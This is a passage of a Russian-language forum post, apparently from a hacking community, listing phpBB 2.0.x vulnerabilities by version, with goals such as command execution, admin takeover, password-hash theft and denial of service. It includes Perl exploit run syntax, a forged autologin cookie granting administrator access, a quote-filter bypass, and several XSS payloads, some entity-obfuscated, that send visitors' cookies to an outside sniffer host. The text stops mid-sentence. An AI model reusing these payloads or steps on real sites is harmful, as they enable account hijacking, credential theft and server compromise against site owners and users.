ip<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u0442\u0430\u043a \u0441\u0435\u0431\u0435<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0435\u0442 \u043f\u043e\u0434\u043c\u0435\u043d\u0438\u0442\u044c ip \u043e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u0435\u043b\u044f \u043d\u0430 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u043b\u044c\u043d\u044b\u0439<br>\\nExploit: <a>http:\/\/securityvulns.ru\/Gdocument110.html [out.php?to=http%3A%2F%2Fsecurityvulns.ru%2FGdocument110.html]\\n\\t\\t\\t\\t\\t<\/a>\\n<br>\\n\\n<br>\\nphpBB 2.0.10 <br>\\n\u041f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u043c \u0432\u0435\u0440\u0441\u0438\u0438 \u0441 7 \u043f\u043e 9, \u0442.\u043a. \u0432 \u043d\u0438\u0445 \u043f\u0440\u0438\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442 \u0442\u0435 \u0436\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438, \u0447\u0442\u043e \u0438 \u0432 phpBB 2.0.10.<br>\\n\u0426\u0435\u043b\u044c: (1) \u0412\u044b\u043f\u043e\u043b\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u043b\u044c\u043d\u044b\u0445 \u043a\u043e\u043c\u0430\u043d\u0434.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u0411\u044b\u043b\u0430 \u0432\u044b\u043f\u0443\u0449\u0435\u043d\u0430 \u0442\u0430\u043a \u0436\u0435 \u0432 2002. \u0414\u0430\u043d\u043d\u0430\u044f \u0432\u0435\u0440\u0441\u0438\u044f \u0432\u0441\u0442\u0440\u0435\u0447\u0430\u0435\u0442\u0441\u044f \u043d\u0430\u043c\u043d\u043e\u0433\u043e \u0447\u0430\u0449\u0435, \u0447\u0435\u043c \u043c\u043b\u0430\u0434\u0448\u0438\u0435. \u041d\u043e \u0440\u0435\u0436\u0435 \u0447\u0435\u043c \u0441\u0442\u0430\u0440\u0448\u0438\u0435 =). \u0411\u044b\u043b \u043f\u0440\u043e\u0438\u0437\u0432\u0435\u0434\u0451\u043d \u0434\u0435\u0444\u0435\u0439\u0441 \u0441\u0430\u0439\u0442\u0430 phpbb.com, \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u043d\u0430\u0439\u0434\u0435\u043d\u043d\u043e\u0439 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438 \u0432 \u044d\u0442\u043e\u0439 \u0432\u0435\u0440\u0441\u0438\u0438.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u041d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u0430\u044f \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0432\u0445\u043e\u0434\u043d\u044b\u0445 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432 \u0432 viewtopic.php. <br>\\nExploit: <a>http:\/\/milw0rm.com\/id.php?id=647 [out.php?to=http%3A%2F%2Fmilw0rm.com%2Fid.php%3Fid%3D647]\\n\\t\\t\\t\\t\\t<\/a> \u0417\u0430\u043f\u0443\u0441\u043a\u0430\u0442\u044c \\\"perl exp.pl [*URL] [DIR] [NUM] [CMD]\\\"<br>\\n\u0413\u0434\u0435 [*URL] - \u0443\u0440\u043b \u0441\u0430\u0439\u0442\u0430 (\u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 <a>http:\/\/www.test.com [out.php?to=http%3A%2F%2Fwww.test.com]\\n\\t\\t\\t\\t\\t<\/a>), [DIR] - \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u044f \u0432 \u043a\u043e\u0442\u043e\u0440\u043e\u0439 \u043d\u0430\u0445\u043e\u0434\u0438\u0442\u0441\u044f \u0444\u043e\u0440\u0443\u043c(\u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 \/forum\/ \u0438\u043b\u0438 \/forum), [NUM] - \u043d\u043e\u043c\u0435\u0440 \u0442\u043e\u043f\u0438\u043a\u0430 (\u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0435\u0433\u043e), [CMD] - \u043a\u043e\u043c\u0430\u043d\u0434\u0430 \u043a\u043e\u0442\u043e\u0440\u0443\u044e \u0441\u043b\u0435\u0434\u0443\u0435\u0442 \u0432\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c (\u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 ls -la, \u0441\u043f\u0440\u0430\u0432\u043e\u0447\u043d\u0438\u043a \u0432\u0441\u0435\u0445 \u043a\u043e\u043c\u0430\u043d\u0434 *nix <a>http:\/\/forum.antichat.ru\/threadnav7345-1-10.html [out.php?to=http%3A%2F%2Fforum.antichat.ru%2Fthreadnav7345-1-10.html]\\n\\t\\t\\t\\t\\t<\/a>)<br>\\nvideo: -<br>\\n\\n<br>\\n\u0426\u0435\u043b\u044c: (2) \u041f\u043e\u043f\u0430\u0434\u0430\u043d\u0438\u0435 \u0432 \u0430\u0434\u043c\u0438\u043d\u043a\u0443 \u043e\u0431\u0445\u043e\u0434\u044f \u043e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u0438\u044f.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: -<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u041d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u0430\u044f \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0432\u0445\u043e\u0434\u043d\u044b\u0445 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432 \u0432 Admin_Styles.PHP.<br>\\nExploit: \u0412 \u0430\u0440\u0445\u0438\u0432\u0435 \u0441 \u0432\u0438\u0434\u0435\u043e =)<br>\\nVideo: <a>http:\/\/video.antichat.net\/videos\/wizi\/vhackbbshwizi.rar [out.php?to=http%3A%2F%2Fvideo.antichat.net%2Fvideos%2Fwizi%2Fvhackbbshwizi.rar]\\n\\t\\t\\t\\t\\t<\/a>\\n<br>\\n\\n<br>\\nphpBB &lt;= 2.0.11<br>\\n\u0426\u0435\u043b\u044c: \u0412\u044b\u043f\u043e\u043b\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u043b\u044c\u043d\u044b\u0445 \u043a\u043e\u043c\u0430\u043d\u0434<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u0411\u044b\u043b\u0430 \u0432\u044b\u043f\u0443\u0449\u0435\u043d\u0430 \u0442\u0430\u043a \u0436\u0435 \u0432 2002.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u041d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u0430\u044f \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0432\u0445\u043e\u0434\u043d\u044b\u0445 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432 \u0432 viewtopic.php - \u0433\u043e\u0440\u0435-\u043a\u043e\u0434\u0435\u0440\u044b \u043f\u043b\u043e\u0445\u043e \u0437\u0430\u043f\u0430\u0442\u0447\u0438\u043b\u0438 \u043f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0443\u044e \u0431\u0430\u0433\u0443 - \u0444\u0438\u043b\u044c\u0442\u0440\u0430\u0446\u0438\u044f \u043a\u043e\u0432\u044b\u0447\u043a\u0438 \u043e\u0431\u0445\u043e\u0434\u0438\u0442\u0441\u044f \u043a\u0430\u043a %2527<br>\\nExploit: <a>http:\/\/www.site.ru\/forum\/viewtopic.p......2527&amp;var=id [out.php?to=http%3A%2F%2Fwww.site.ru%2Fforum%2Fviewtopic.php%3Ft%3D2...2527%26amp%3Bvar%3Did]\\n\\t\\t\\t\\t\\t<\/a>\\n<br>\\n\\n<br>\\nphpBB &lt;= 2.0.12<br>\\n\u0426\u0435\u043b\u044c: \u0412\u0445\u043e\u0434 \u043d\u0430 \u0444\u043e\u0440\u0443\u043c \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u043e\u043c \u0430\u0434\u043c\u0438\u043d\u0438\u0441\u0442\u0440\u0430\u0442\u043e\u0440\u0430.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: -<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0414\u043b\u044f \u043d\u0430\u0447\u0430\u043b\u0430 \u043d\u0430\u043c \u0441\u043b\u0435\u0434\u0443\u0435\u0442 \u0437\u0430\u0440\u0435\u0433\u0430\u0442\u044c\u0441\u044f \u043d\u0430 \u0444\u043e\u0440\u0443\u043c\u0435. \u0417\u0430\u0442\u0435\u043c, \u0432\u043e\u0439\u0442\u0438 \u043f\u043e\u0434 \u0441\u0432\u043e\u0438\u043c \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u043e\u043c \u0438 \u0435\u0441\u043b\u0438 \u0441\u0442\u043e\u0438\u0442 \u0433\u0430\u043b\u043a\u0430 \\\"\u0410\u0432\u0442\u043e\u043c\u0430\u0442\u0438\u0447\u0435\u0441\u043a\u0438\u0439 \u0432\u0445\u043e\u0434\\\",\u0442\u043e \u0443\u0431\u0440\u0430\u0442\u044c \u0435\u0451. \u041d\u0430\u043c \u043d\u0443\u0436\u043d\u043e \u043e\u0442\u0440\u0435\u0434\u0430\u043a\u0442\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u043a\u0443\u043a\u0438\u0441\u044b (\u043f\u043e\u0441\u043e\u0432\u0435\u0442\u0443\u044e \u0434\u0435\u043b\u0430\u0442\u044c \u044d\u0442\u043e \u0432 \u043e\u043f\u0435\u0440\u0435 Tools-&gt;Advanced-&gt;Cookies),<br>\\n\u0432\u043c\u0435\u0441\u0442\u043e<br>\\n\u0426\u0438\u0442\u0430\u0442\u0430<br>\\na%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%2 2%22%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%22X%22%3B%7  D<br>\\n\\n<br>\\nX - \u043d\u0430\u0448 ID ,<br>\\n\u0430 \u043c\u0435\u043d\u044f\u0435\u043c \u043d\u0430<br>\\n\u0426\u0438\u0442\u0430\u0442\u0430<br>\\na%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb%3A1%3Bs% 3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D<br>\\n\\n<br>\\n\\n<br>\\n2 - \u043a\u0430\u043a \u0443\u0436\u0435 \u0433\u043e\u0432\u043e\u0440\u0438\u043b\u043e\u0441\u044c \u0432\u044b\u0448\u0435, ID \u0430\u0434\u043c\u0438\u043d\u0430<br>\\nExploit: \\\"a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb%3A1%3Bs  % 3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D\\\"<br>\\nVideo: -<br>\\n\\n<br>\\nphpBB &lt;= 2.0.13<br>\\n\u0426\u0435\u043b\u044c: \u043f\u0440\u043e\u0441\u043c\u043e\u0442\u0440 hash'a \u043f\u0430\u0440\u043e\u043b\u044f, \u043b\u044e\u0431\u043e\u0433\u043e \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: -<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0423\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u043f\u0440\u0438\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442 \u0432 \u043c\u043e\u0434\u0443\u043b\u0435 downloads.php. \u0415\u0441\u0442\u044c \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u044c SQL \u0438\u043d\u044a\u0435\u043a\u0446\u0438\u0438<br>\\nExploit: <a>http:\/\/milw0rm.com\/id.php?id=907 [out.php?to=http%3A%2F%2Fmilw0rm.com%2Fid.php%3Fid%3D907]\\n\\t\\t\\t\\t\\t<\/a> \\n<br>\\n\u0417\u0430\u043f\u0443\u0441\u043a\u0430\u0442\u044c \\\"perl exp.pl &lt;site&gt; &lt;dir&gt; &lt;id&gt;\\\" <br>\\n\u0413\u0434\u0435 &lt;site&gt; URL \u0441\u0430\u0439\u0442\u0430 &lt;dir&gt; - \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u044f &lt;id&gt; - \u043d\u0443\u0436\u043d\u044b\u0439 \u043d\u0430\u043c \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c<br>\\nVideo: -<br>\\n\\n<br>\\nphpBB &lt;= 2.0.15<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u0418\u043c\u044f,\u041b\u043e\u0433\u0438\u043d\u0430, \u041f\u0430\u0440\u043e\u043b\u044f \u043e\u0442 \u0411\u0414.<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: -<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0423\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u043f\u0440\u0438\u0441\u0442\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442 \u0432 \u043c\u043e\u0434\u0443\u043b\u0435 viewtopic.php. <br>\\nExploit: <a>http:\/\/milw0rm.com\/id.php?id=1080 [out.php?to=http%3A%2F%2Fmilw0rm.com%2Fid.php%3Fid%3D1080]\\n\\t\\t\\t\\t\\t<\/a> \u0417\u0430\u043f\u0443\u0441\u043a\u0430\u0442\u044c \\\"perl exp.pl &lt;server&gt; &lt;dir&gt; &lt;id&gt; \\\\r\\\\n\\\" <br>\\n\u0413\u0434\u0435 &lt;server&gt; - ip \u0441\u0435\u0440\u0432\u0435\u0440\u0430, &lt;dir&gt; - \u0434\u0438\u0440\u0435\u043a\u0442\u043e\u0440\u0438\u044f \u0432 \u043a\u043e\u0442\u043e\u0440\u043e\u0439 \u043d\u0430\u0445\u043e\u0434\u0438\u0442\u0441\u044f \u0444\u043e\u0440\u0443\u043c &lt;id&gt; \u043d\u043e\u043c\u0435\u0440 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0435\u0433\u043e \u0442\u043e\u043f\u0438\u043a\u0430.<br>\\nVideo: -<br>\\n\\n<br>\\nphpBB &lt;= 2.0.16<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 hash'a \u043f\u0430\u0440\u043e\u043b\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: -<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0412 \u0434\u0430\u043d\u043d\u043e\u0439 \u0432\u0435\u0440\u0441\u0438\u0438 \u043f\u0440\u0438\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442 XSS (Cross Site Scripting \u0431\u043e\u043b\u0435\u0435 \u043f\u043e\u0434\u0440\u043e\u0431\u043d\u043e \u043f\u0440\u043e XSS \u043c\u043e\u0436\u043d\u043e \u043f\u043e\u0447\u0438\u0442\u0430\u0442\u044c \u0442\u0443\u0442 <a>http:\/\/antichat.ru\/txt\/xssoverview\/ [out.php?to=http%3A%2F%2Fantichat.ru%2Ftxt%2Fxssoverview%2F]\\n\\t\\t\\t\\t\\t<\/a> \u0438\u043b\u0438 <a>http:\/\/ha.ckers.org\/xss.html [out.php?to=http%3A%2F%2Fha.ckers.org%2Fxss.html]\\n\\t\\t\\t\\t\\t<\/a>), \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u043a\u0443\u043a\u0438\u0441\u044b. \u041e\u043d\u0438 \u0432\u044b\u0441\u044b\u043b\u0430\u044e\u0442\u0441\u044f \u043d\u0430 \u0441\u043d\u0438\u0444\u0444\u0435\u0440,<br>\\n\u043b\u043e\u0433\u0438 \u043a\u043e\u0442\u043e\u0440\u043e\u0433\u043e \u043c\u043e\u0436\u043d\u043e \u043f\u043e\u0441\u043c\u043e\u0442\u0440\u0435\u0442\u044c \u0437\u0434\u0435\u0441\u044c <a>http:\/\/antichat.ru\/sniff\/log.php [out.php?to=http%3A%2F%2Fantichat.ru%2Fsniff%2Flog.php]\\n\\t\\t\\t\\t\\t<\/a>. <br>\\nExploit:<br>\\n\u041a\u043e\u0434<br>\\n[*color=#EFEFEF][*url]www.ut[*url=www.s=''style='font-size:0;color:#EFEFEF'style='top:expression(eval(th  is.sss));'sss=`i=new\/**\/Image();i.src='http:\/\/antichat.ru\/cgi-bin\/s.jpg?'+document.cookie;this.sss=null`style='font-size:0;][\/url][\/url]'[\/color]<br>\\n\\n<br>\\n\\n<br>\\nphpBB &lt;= 2.0.16<br>\\n\u0426\u0435\u043b\u044c: 2.0.16 Installation Path Disclosure<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: -<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0440\u0430\u0441\u043a\u0440\u044b\u0442\u0438\u0435 \u0434\u0430\u043d\u043d\u044b\u0445<br>\\nExploit: <a>http:\/\/someshit.net\/showthread.php?t=71 [out.php?to=http%3A%2F%2Fsomeshit.net%2Fshowthread.php%3Ft%3D71]\\n\\t\\t\\t\\t\\t<\/a>\\n<br>\\nVideo: -<br>\\n\\n<br>\\nphpBB &lt;= 2.0.17<br>\\n\u0426\u0435\u043b\u044c: \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u043b\u044c\u043d\u044b\u0445 \u043a\u043e\u043c\u0430\u043d\u0434 \u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0435(php-inj)<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: -<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0412 \u0434\u0430\u043d\u043d\u043e\u0439 \u0432\u0435\u0440\u0441\u0438\u0438 \u043f\u0440\u0438\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u0432 \u043c\u043e\u0434\u0443\u043b\u0435 profile.php. <br>\\nExploit: <a>http:\/\/rst.void.ru\/download\/r57phpbb2017.txt [out.php?to=http%3A%2F%2Frst.void.ru%2Fdownload%2Fr57phpbb2017.txt]\\n\\t\\t\\t\\t\\t<\/a> \u0417\u0430\u043f\u0443\u0441\u043a\u0430\u0442\u044c \\\"perl exp.pl &lt;URL&gt; &lt;cmd&gt;\\\"<br>\\n\u0413\u0434\u0435 &lt;URL&gt; - \u0441\u0441\u044b\u043b\u043a\u0430 \u0434\u043e \u0444\u043e\u0440\u0443\u043c\u0430 \u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 <a>http:\/\/site.com\/phpBB\/ [out.php?to=http%3A%2F%2Fsite.com%2FphpBB%2F]\\n\\t\\t\\t\\t\\t<\/a>, &lt;cmd&gt; - \u043d\u0443\u0436\u043d\u0430\u044f \u043a\u043e\u043c\u0430\u043d\u0434\u0430 (\u043e \u043a\u043e\u043c\u0430\u043d\u0434\u0430\u0445 \u0447\u0438\u0442\u0430\u0435\u043c \u0442\u0443\u0442 <a>http:\/\/forum.antichat.ru\/threadnav7345-1-10.html [out.php?to=http%3A%2F%2Fforum.antichat.ru%2Fthreadnav7345-1-10.html]\\n\\t\\t\\t\\t\\t<\/a>).<br>\\nVideo: -<br>\\n\\n<br>\\nphpbb &lt;= 2.0.18<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u0441\u0435\u0441\u0441\u0438\u0438 \u0430\u0434\u043c\u0438\u043d\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: XSS \u0432 \u0441\u043e\u0431\u0449\u0435\u043d\u0438\u0438<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0442\u0440\u0435\u0431\u0443\u0435\u0442 \u0432\u043a\u043b\u044e\u0447\u0435\u043d\u044b\u0445 BB-\u0442\u044d\u0433\u043e\u0432 \u0438\u043b\u0438 HTML \u043d\u0430 \u0444\u043e\u0440\u0443\u043c\u0435<br>\\nExploit:<br>\\n\u041a\u043e\u0434<br>\\n&lt;B C=\\\"&gt;\\\" onmouseover=\\\"alert(document.location='http:\/\/HOST\/cookies?'+document.cookie)\\\" X=\\\"&lt;B \\\"&gt; H A L L O &lt;\/B&gt;<br>\\n\\n<br>\\n\\n<br>\\n\u041a\u043e\u0434<br>\\n&lt;B C=\\\"&gt;\\\" ''style='font-size:0;color:#EFEFEF'style='top:expression(eval(th  is.sss));'sss=`i=new\/**\/Image();i.src='http:\/\/www.url.com\/cookie\/c.php?c='+document.cookie;this.sss=null`style='fon  t-size:0; X=\\\"&lt;B \\\"&gt;'&lt;\/B&gt;<br>\\n\\n<br>\\n\u041a\u043e\u0434<br>\\n\\n<a>http:\/\/www.&lt;a href=\\\"out.php?to=http%..._blank\\\"&gt;wj&lt;\/a&gt; [out.php?to=http%3A%2F%2Fwww.%3Ca%20href%3D%26quot%3Bout.php%3Fto%3Dhttp%253A%252F%252Fwj.com%252Fstyle%253Ddisplay%253Anone%253Bbackground%253Aurl%2528java%2520script%253Aalert%2528%2529%2529%26quot%3B%20title%3D%26quot%3B%C1%E5%E7%EE%EF%E0%F1%ED%E0%FF%20%F1%F1%FB%EB%EA%E0%2C%20Referer%20%ED%E5%20%EF%E5%F0%E5%E4%E0%E5%F2%F1%FF%26quot%3B%20rel%3D%26quot%3Bnofollow%26quot%3B%20target%3D%26quot%3B_blank%26quot%3B%3Ewj%3C%2Fa%3E]\\n\\t\\t\\t\\t\\t<\/a>\\n<br>\\n\\n<br>\\n\\n<br>\\nphpBB &lt;= 2.0.18<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 hash'a \u043f\u0430\u0440\u043e\u043b\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: \u043d\u0430\u0439\u0434\u0435\u043d\u0430 WJ (White Jordan =)<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0412 \u0434\u0430\u043d\u043d\u043e\u0439 \u0432\u0435\u0440\u0441\u0438\u0438 \u043f\u0440\u0438\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442 XSS. <br>\\nExploit:<br>\\n\u041a\u043e\u0434<br>\\n[UR*L]http:\/\/www.[U*RL=http:\/\/wj.com\/style=display:none;background&amp;+#58;&amp;+#117;&amp;+#114;&amp;  +#108;&amp;+#40;&amp;+#106;&amp;+#97;&amp;+#118;&amp;+#97;&amp;+#115;&amp;+#99  ;&amp;+#114;&amp;+#105;&amp;+#<br>\\n112;&amp;+#116;&amp;+#58;&amp;+#100;&amp;+#111;&amp;+#99;&amp;+#117;&amp;+#109  ;&amp;+#101;&amp;+#110;&amp;+#116;&amp;+#46;&amp;+#105;&amp;+#109;&amp;+#97;&amp;+  #103;&amp;+<br>\\n#101;&amp;+#115;&amp;+#91;&amp;+#<br>\\n49;&amp;+#93;&amp;+#46;&amp;+#115;&amp;+#114;&amp;+#99;&amp;+#61;&amp;+#34;&amp;+#  104;&amp;+#116;&amp;+#116;&amp;+#<br>\\n112;&amp;+#58;&amp;+#47;&amp;+#47;&amp;+#97;&amp;+#110;&amp;+#116;&amp;+#<br>\\n105;&amp;+#99;&amp;+#104;&amp;+#97;&amp;+#116;&amp;+#46;&amp;+#114;&amp;+#117;  &amp;+#47;&amp;+#99;&amp;+#103;&amp;+#105;&amp;+#45;&amp;+#98;&amp;+#105;&amp;+#11  0;&amp;+#47;&amp;<br>\\n+#115;&amp;+#46;&amp;+#106;&amp;+#112;&amp;+#103;&amp;+#63;&amp;+#34;+docu  ment.cookie;&amp;+#41;&amp;+#32;]wj[\/*URL][\/*URL]<br>\\n\\n<br>\\n\u0427\u0442\u043e \u0431\u044b \u0432\u043e\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c\u0441\u044f \u0441\u043f\u043b\u043e\u0439\u0442\u043e\u043c \u0443\u0431\u0438\u0440\u0430\u0435\u043c \u043f\u043b\u044e\u0441\u044b \u043c\u0435\u0436\u0434\u0443 \u0441\u0438\u043c\u0432\u043e\u043b\u0430\u043c\u0438 &amp; \u0438 #(\u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 \u0431\u044b\u043b\u043e \\\"&amp;+#40\\\" \u0441\u0442\u0430\u043b\u043e -\\\"&amp;#40\\\")<br>\\n\\n<br>\\nphpbb &lt;= 2.0.19<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u043f\u0430\u0440\u043e\u043b\u044f \u0430\u0434\u043c\u0438\u043d\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: phpBB Style Changer\\\\Viewer MOD SQL injection Exploit<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: sql-inj \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u0432 index.php?s=[SQL] \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0435\u0442 \u0432\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u043b\u044c\u043d\u044b\u0439 \u0437\u0430\u043f\u0440\u043e\u0441 \u0432 \u0431\u0434<br>\\nExploit: <a>http:\/\/milw0rm.com\/exploits\/1469 [out.php?to=http%3A%2F%2Fmilw0rm.com%2Fexploits%2F1469]\\n\\t\\t\\t\\t\\t<\/a>\\n<br>\\n\\n<br>\\nphpbb = 2.0.19<br>\\n\u0426\u0435\u043b\u044c: DoS \u0444\u043e\u0440\u0443\u043c\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: -<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0423\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0435\u0442 \u0437\u0430\u0431\u0430\u043d\u0438\u0442\u044c \u0432\u0441\u0435\u0445 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u0439 \u043d\u0430 \u0444\u043e\u0440\u0443\u043c\u0435<br>\\nExploit: <a>http:\/\/forum.comp-info.ru\/showthread.php?threadid=238 [out.php?to=http%3A%2F%2Fforum.comp-info.ru%2Fshowthread.php%3Fthreadid%3D238]\\n\\t\\t\\t\\t\\t<\/a>\\n<br>\\n\\n<br>\\nphpbb &lt;= 2.0.19<br>\\n\u0426\u0435\u043b\u044c: DoS \u0444\u043e\u0440\u0443\u043c\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: Neo Security Team (\u0430\u0432\u0442\u043e\u0440 - HaCkZaTaN)<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: \u0421\u043f\u043b\u043e\u0438\u0442 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0438\u0440\u0443\u0435\u0442 \u043d\u0435\u043e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u043d\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043d\u0438\u043a\u043e\u0432 \u0438\u043b\u0438 \u0434\u0435\u043b\u0430\u0435\u0442 